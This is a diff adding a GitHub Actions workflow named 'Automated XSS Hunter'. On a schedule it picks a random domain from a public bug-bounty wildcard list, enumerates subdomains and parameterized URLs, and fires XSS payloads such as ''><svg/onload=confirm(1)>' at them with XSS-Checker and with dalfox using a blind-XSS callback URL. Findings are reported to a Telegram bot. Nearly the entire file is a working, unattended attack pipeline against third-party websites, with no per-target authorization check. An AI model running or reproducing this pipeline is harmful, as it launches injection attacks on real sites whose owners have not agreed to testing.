@@ -1,0 +1,134 @@
+name: Automated XSS Hunter
+
+on:
+  schedule:
+    - cron: '0 */12 * * *'  # Runs every 12 hours
+  workflow_dispatch:  # Allows manual triggering
+
+env:
+  OUTPUT_DIR: 'xss-results'
+  GO111MODULE: on
+  TARGETS_URL: 'https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt'
+
+jobs:
+  xss-hunting:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-pip wget jq chromium-browser
+
+      - name: Install Tools
+        run: |
+          # Install URL discovery tools
+          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          go install -v github.com/tomnomnom/qsreplace@latest
+          go install -v github.com/tomnomnom/anew@latest
+          go install -v github.com/lc/gau/v2/cmd/gau@latest
+          go install -v github.com/hahwul/dalfox/v2@latest
+          
+          # Install Python tools
+          pip3 install --upgrade pip
+          pip3 install XSS-Checker
+          pip3 install bxss
+
+      - name: Setup Chrome for XSS Testing
+        run: |
+          wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+          sudo apt install ./google-chrome-stable_current_amd64.deb
+          CHROME_VERSION=$(google-chrome --version | awk '{print $3}' | cut -d'.' -f1)
+          wget https://chromedriver.storage.googleapis.com/LATEST_RELEASE_${CHROME_VERSION}
+          CHROMEDRIVER_VERSION=$(cat LATEST_RELEASE_${CHROME_VERSION})
+          wget https://chromedriver.storage.googleapis.com/${CHROMEDRIVER_VERSION}/chromedriver_linux64.zip
+          unzip chromedriver_linux64.zip
+          sudo mv chromedriver /usr/local/bin/
+          sudo chmod +x /usr/local/bin/chromedriver
+
+      - name: Select Random Target
+        id: target
+        run: |
+          # Download wildcards list and select random target
+          wget -q ${{ env.TARGETS_URL }} -O wildcards.txt
+          TARGET=$(shuf -n 1 wildcards.txt | sed 's/^\*\.//')
+          echo "target=$TARGET" >> $GITHUB_OUTPUT
+          
+          # Send scan initiation notification
+          START_MSG="🔍 Starting XSS Scan%0A%0ATarget: $TARGET%0ATime: $(date '+%Y-%m-%d %H:%M:%S UTC')"
+          curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d "chat_id=${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d "text=$START_MSG" \
+            -d "parse_mode=HTML"
+
+      - name: Initial Reconnaissance
+        run: |
+          mkdir -p ${{ env.OUTPUT_DIR }}/{subdomains,urls,parameters,results}
+          
+          # Subdomain enumeration
+          subfinder -d ${{ steps.target.outputs.target }} -all -recursive > ${{ env.OUTPUT_DIR }}/subdomains/raw_subdomains.txt
+          cat ${{ env.OUTPUT_DIR }}/subdomains/raw_subdomains.txt | httpx -silent > ${{ env.OUTPUT_DIR }}/subdomains/live_subdomains.txt
+
+      - name: URL Discovery
+        run: |
+          # Gather URLs using multiple tools
+          cat ${{ env.OUTPUT_DIR }}/subdomains/live_subdomains.txt | while read domain; do
+            gau --subs $domain >> ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt
+            katana -u $domain -d 5 -jc -ef css,png,jpg,gif,woff,woff2 >> ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt
+          done
+          
+          # Filter and clean URLs
+          cat ${{ env.OUTPUT_DIR }}/urls/raw_urls.txt | grep "=" | sort -u > ${{ env.OUTPUT_DIR }}/urls/parameterized_urls.txt
+          cat ${{ env.OUTPUT_DIR }}/urls/parameterized_urls.txt | sed 's/=.*/=/' | sort -u > ${{ env.OUTPUT_DIR }}/parameters/unique_parameters.txt
+
+      - name: XSS Scanning
+        run: |
+          # Basic XSS Detection
+          cat ${{ env.OUTPUT_DIR }}/urls/parameterized_urls.txt | \
+            qsreplace "'><svg/onload=confirm(1)>" | \
+            while read url; do
+              XSS-Checker \
+                --url "$url" \
+                --threads 10 \
+                --timeout 15 \
+                --browser Chrome \
+                --sig "XSS_FOUND" \
+                --writefile "${{ env.OUTPUT_DIR }}/results/basic_xss.txt" \
+                --silent
+            done
+          
+          # Advanced XSS Testing with Dalfox
+          cat ${{ env.OUTPUT_DIR }}/urls/parameterized_urls.txt | \
+            dalfox pipe \
+            --blind ${{ secrets.XSS_HUNTER_URL }} \
+            --worker 5 \
+            --skip-bav \
+            --skip-mining-dom \
+            --follow-redirects \
+            --output ${{ env.OUTPUT_DIR }}/results/dalfox_results.txt
+
+      - name: Send Results
+        if: always()
+        run: |
+          # Count vulnerabilities
+          BASIC_XSS_COUNT=$(grep -c "Vulnerable" "${{ env.OUTPUT_DIR }}/results/basic_xss.txt" || echo "0")
+          DALFOX_COUNT=$(jq -r '.[] | select(.severity == "High")' "${{ env.OUTPUT_DIR }}/results/dalfox_results.txt" | wc -l || echo "0")
+          TOTAL_VULNS=$((BASIC_XSS_COUNT + DALFOX_COUNT))
+          
+          if [ "$TOTAL_VULNS" -gt 0 ]; then
+            # Send completion notification with vuln count
+            COMPLETE_MSG="✅ XSS Scan Complete%0A%0ATarget: ${{ steps.target.outputs.target }}%0ATime: $(date '+%Y-%m-%d %H:%M:%S UTC')%0AVulnerabilities Found: $TOTAL_VULNS"
+            curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+              -d "chat_id=${{ secrets.TELEGRAM_CHAT_ID }}" \
+              -d "text=$COMPLETE_MSG" \
+              -d "parse_mode=HTML"
+          fi
